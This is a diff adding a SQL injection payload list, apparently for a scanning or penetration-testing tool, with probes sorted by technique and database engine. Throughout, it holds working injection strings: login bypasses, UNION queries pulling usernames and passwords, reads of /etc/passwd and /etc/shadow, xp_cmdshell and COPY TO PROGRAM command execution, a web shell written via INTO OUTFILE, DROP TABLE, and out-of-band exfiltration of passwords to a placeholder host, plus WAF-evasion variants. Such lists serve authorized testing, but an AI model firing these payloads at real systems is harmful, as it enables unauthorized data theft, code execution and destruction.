@@ -1,0 +1,245 @@
+# category: sqli
+# description: SQL injection probes — error-based, boolean-based, UNION, time-based, stacked.
+# references: OWASP SQL Injection Prevention, PortSwigger SQLi labs, pentestmonkey MySQL cheatsheet.
+# notes: Inert probe strings; policy/scope still decide whether anything is sent.
+
+'
+"
+`
+\
+';--
+";--
+`;--
+'--
+"--
+'#
+"#
+' #
+' OR 1=1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+" OR 1=1 /*
+') OR ('1'='1
+')) OR (('1'='1
+' OR 'x'='x
+' OR 1 -- -
+" OR 1 -- -
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin'--
+admin'#
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin" --
+admin"#
+' or sleep(5)--
+" or sleep(5)#
+' OR SLEEP(5)--
+'); WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+'; IF(1=1) WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND BENCHMARK(5000000,SHA1(1))--
+pg_sleep(5)
+SELECT pg_sleep(5)--
+';SELECT pg_sleep(5)--
+';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username||':'||password FROM users--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT NULL,load_file('/etc/passwd')--
+' UNION SELECT NULL,LOAD_FILE(0x2f6574632f706173737764)--
+' UNION SELECT NULL INTO OUTFILE '/tmp/x'--
+' AND 1=1--
+' AND 1=0--
+' AND 'a'='a
+' AND 'a'='b
+' AND SUBSTRING(version(),1,1)='5'--
+' AND ASCII(SUBSTRING(database(),1,1))=97--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1 AND 1=1
+1 AND 1=0
+1 AND SLEEP(5)
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+1' GROUP BY 1--
+1' HAVING 1=1--
+1 OR 1=1
+1) OR 1=1--
+1)) OR 1=1--
+1))) OR 1=1--
+1' OR SUBSTRING(user(),1,1)='r'--
+1' AND SLEEP(5) AND 'a'='a
+1'; EXEC xp_cmdshell 'dir'--
+1'; EXEC sp_configure 'show advanced options',1--
+1'; DROP TABLE users--
+1'; INSERT INTO users VALUES('a','b')--
+'||1||'
+'||(SELECT '')||'
+'||pg_sleep(5)||'
+;--
+;%00
+;/*
+'/*
+' or ''='
+' or '' = '
+'+or+1=1--
+%27+OR+1%3D1--
+%27%20OR%20%271%27%3D%271
+%2527%2520OR%25201%253D1
+'%0AOR%0A'1'='1
+' /*!50000OR*/ 1=1--
+' UNION/*!50000SELECT*/ 1,2,3--
+' UNION %0bSELECT 1,2,3--
+' UN/**/ION SE/**/LECT 1,2,3--
+' UNION SeLeCt 1,2,3--
+0x270x6f0x72010x3d1
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)XOR'Z
+" or '' = "
+" or "a"="a
+" or ""=""
+" or (("a"))=(("a
+" or 1=1 limit 1--
+' or 1=1 limit 1 --
+' or 1=1 LIMIT 1 OFFSET 0 --
+' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID(version(),1,1))=53,0,5)))))a)--
+UNION SELECT user,password FROM mysql.user--
+' UNION SELECT NULL,NULL,NULL,FLAG FROM flags--
+'; ANALYZE TABLE users--
+'; COPY (SELECT '') TO '/tmp/x'--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),0)--
+'||(SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)||'
+' AND (SELECT 1 FROM pg_sleep(5))--
+'; CREATE TABLE cmd_exec(cmd_output TEXT);--
+'; COPY cmd_exec FROM PROGRAM 'id';--
+
+# ── Oracle-specific ────────────────────────────────────────────────────────
+' AND 1=UTL_INADDR.get_host_address('x.test')--
+' AND UTL_HTTP.request('http://x.test')--
+' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--
+' AND DBMS_LOCK.SLEEP(5)--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT NULL FROM dual--
+' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--
+' AND (SELECT COUNT(*) FROM v$session)>0--
+
+# ── Microsoft SQL Server ───────────────────────────────────────────────────
+' AND 1=(SELECT @@version)--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; EXEC master..xp_dirtree '\\x.test\a'--
+'; EXEC master.sys.xp_fileexist 'C:\windows\win.ini'--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--
+' AND 1=db_name()--
+' AND 1=HOST_NAME()--
+' AND 1=SYSTEM_USER--
+' AND 1=IS_SRVROLEMEMBER('sysadmin')--
+'; WAITFOR DELAY '0:0:5'--
+'; IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'--
+' AND 1=LEN(SYSTEM_USER)--
+
+# ── PostgreSQL ─────────────────────────────────────────────────────────────
+' AND 1=pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' AND 1=cast(version() AS int)--
+' AND 1=cast(current_user AS int)--
+' AND 1=cast(current_database() AS int)--
+' AND (SELECT COUNT(*) FROM pg_shadow WHERE usename=current_user)>0--
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; CREATE OR REPLACE FUNCTION f() RETURNS int AS $$...$$ LANGUAGE plpythonu--
+'; SELECT lo_from_bytea(0,pg_read_binary_file('/etc/passwd'))--
+' AND 1=(SELECT dblink_connect('dbname=x host=127.0.0.1'))--
+
+# ── MySQL / MariaDB ────────────────────────────────────────────────────────
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND BENCHMARK(5000000,SHA1(1))--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
+' PROCEDURE ANALYSE(EXTRACTVALUE(5000,CONCAT(0x5c,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)))),1)
+' AND (SELECT 1 FROM mysql.user WHERE user=current_user LIMIT 1)=1--
+'; SELECT ... INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,HEX(LOAD_FILE('/etc/shadow')),3--
+
+# ── SQLite ─────────────────────────────────────────────────────────────────
+' UNION SELECT sql FROM sqlite_master--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT group_concat(tbl_name) FROM sqlite_master--
+' AND (SELECT COUNT(*) FROM sqlite_master)>0--
+' UNION SELECT sqlite_version()--
+'; ATTACH DATABASE '/tmp/x.sql' AS x--
+'; INSERT INTO x.sqlite_master(type,name,tbl_name,rootpage,sql)VALUES('t','x','x',0,'...')--
+
+# ── IBM DB2 ────────────────────────────────────────────────────────────────
+' UNION SELECT TABNAME FROM SYSCAT.TABLES--
+' UNION SELECT NAME FROM SYSIBM.SYSTABLES--
+' AND 1=cast(current_schema AS int)--
+
+# ── 2nd-order / stored ────────────────────────────────────────────────────
+');INSERT INTO log VALUES('</script><script>alert(1)</script>');--
+'; INSERT INTO users VALUES('adm'||CHAR(39)||' OR 1=1--',1)--
+', (SELECT * FROM users)--
+
+# ── Boolean-blind extraction ──────────────────────────────────────────────
+' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'--
+' AND ASCII(SUBSTR((SELECT secret FROM creds LIMIT 1),1,1))>64--
+' AND IIF((SELECT TOP 1 ASCII(SUBSTRING(name,1,1)) FROM sys.tables)>60,1,0)=1--
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)>8--
+' AND (SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN 1 ELSE SLEEP(5) END FROM users LIMIT 1)--
+
+# ── Out-of-band (OAST) ────────────────────────────────────────────────────
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.x.test\\a'))--
+' AND (SELECT UTL_HTTP.request('http://'||(SELECT user FROM dual)||'.x.test') FROM dual)--
+'; DECLARE @q varchar(99)=(SELECT TOP 1 password FROM users);EXEC('xp_dirtree ''\\'+@q+'.x.test\a''')--
+' AND 1=(SELECT lo_import('/etc/passwd'))--
+
+# ── WAF bypass variants ───────────────────────────────────────────────────
+'%0bAND%0b1=1--
+'/**/AND/**/1=1--
+'%0dAND%0d1=1--
+'/*!50000AND*/1=1--
+'/*!12345UNION*/SELECT/*!*/1--
+UNION/*!0SELECT*/1--
+UN/*!*/ION/*!*/SE/*!*/LECT/*!*/1--
+UniOn SeLecT 1,2--
+'+UNION+ALL+SELECT+NULL--
+'+or+'1'='1
+'%20or%20'1'='1
+'%09or%09'1'='1
+'%A0or%A0'1'='1
+' /*!50000OR*/ 1=1 /*!50000AND*/ 1=1--
+' union/**/all/**/select/**/1,2,3--
+' UNION%23%0a SELECT 1,2,3--
+0e1' OR '1'='1
+0x270R0x273130273D273130
+' OR 1=(SELECT 1 FROM (SELECT(SLEEP(5-(IF(ORD(MID(version(),1,1))=53,0,5)))))a)--
